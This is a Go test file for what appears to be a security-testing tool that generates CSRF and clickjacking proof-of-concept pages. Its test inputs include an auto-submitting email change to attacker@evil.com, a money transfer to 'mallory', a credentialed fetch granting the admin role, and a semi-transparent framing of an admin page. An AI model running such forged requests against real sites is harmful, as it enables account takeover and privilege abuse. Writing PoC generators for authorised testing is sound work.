package poc

import (
	"strings"
	"testing"
)

func TestCSRFForm(t *testing.T) {
	html, err := CSRF(CSRFOptions{
		Method:      "POST",
		URL:         "https://victim.example/account/email",
		ContentType: "application/x-www-form-urlencoded",
		Body:        "email=attacker@evil.com&csrf=",
		AutoSubmit:  true,
	})
	if err != nil {
		t.Fatalf("CSRF: %v", err)
	}
	if !strings.Contains(html, `<form action="https://victim.example/account/email" method="POST">`) {
		t.Errorf("missing form action; got:\n%s", html)
	}
	if !strings.Contains(html, `name="email" value="attacker@evil.com"`) {
		t.Errorf("missing email field; got:\n%s", html)
	}
	if !strings.Contains(html, "document.forms[0].submit()") {
		t.Errorf("missing auto-submit; got:\n%s", html)
	}
}

func TestCSRFGetParamsBecomeFields(t *testing.T) {
	html, err := CSRF(CSRFOptions{
		Method: "GET",
		URL:    "https://victim.example/transfer?to=mallory&amount=1000",
	})
	if err != nil {
		t.Fatalf("CSRF: %v", err)
	}
	if !strings.Contains(html, `<form action="https://victim.example/transfer" method="GET">`) {
		t.Errorf("query should be stripped from action; got:\n%s", html)
	}
	if !strings.Contains(html, `name="to" value="mallory"`) || !strings.Contains(html, `name="amount" value="1000"`) {
		t.Errorf("query params should become hidden fields; got:\n%s", html)
	}
}

func TestCSRFFetchForJSON(t *testing.T) {
	html, err := CSRF(CSRFOptions{
		Method:      "POST",
		URL:         "https://api.victim.example/v1/profile",
		ContentType: "application/json",
		Body:        `{"role":"admin"}`,
		AutoSubmit:  true,
	})
	if err != nil {
		t.Fatalf("CSRF: %v", err)
	}
	if !strings.Contains(html, "fetch(") {
		t.Errorf("JSON body should use fetch PoC; got:\n%s", html)
	}
	if !strings.Contains(html, `credentials: "include"`) {
		t.Errorf("fetch must include credentials; got:\n%s", html)
	}
	if !strings.Contains(html, `{\"role\":\"admin\"}`) {
		t.Errorf("body should be JS-escaped; got:\n%s", html)
	}
	if !strings.Contains(html, "send();") {
		t.Errorf("auto-submit should call send(); got:\n%s", html)
	}
}

func TestCSRFRejectsRelativeURL(t *testing.T) {
	if _, err := CSRF(CSRFOptions{Method: "GET", URL: "/relative/path"}); err == nil {
		t.Fatal("expected error for relative URL")
	}
}

func TestClickjacking(t *testing.T) {
	html, err := Clickjacking("https://victim.example/admin")
	if err != nil {
		t.Fatalf("Clickjacking: %v", err)
	}
	if !strings.Contains(html, `<iframe id="target" src="https://victim.example/admin"`) {
		t.Errorf("missing target iframe; got:\n%s", html)
	}
	if !strings.Contains(html, "opacity: 0.35") {
		t.Errorf("iframe should be semi-transparent; got:\n%s", html)
	}
}

func TestClickjackingRejectsRelative(t *testing.T) {
	if _, err := Clickjacking("/admin"); err == nil {
		t.Fatal("expected error for relative URL")
	}
}

func TestJSStringEscapesAngleBrackets(t *testing.T) {
	got := jsString(`</script><img src=x>`)
	if strings.Contains(got, "</script>") {
		t.Errorf("jsString must neutralize </script>; got %s", got)
	}
}
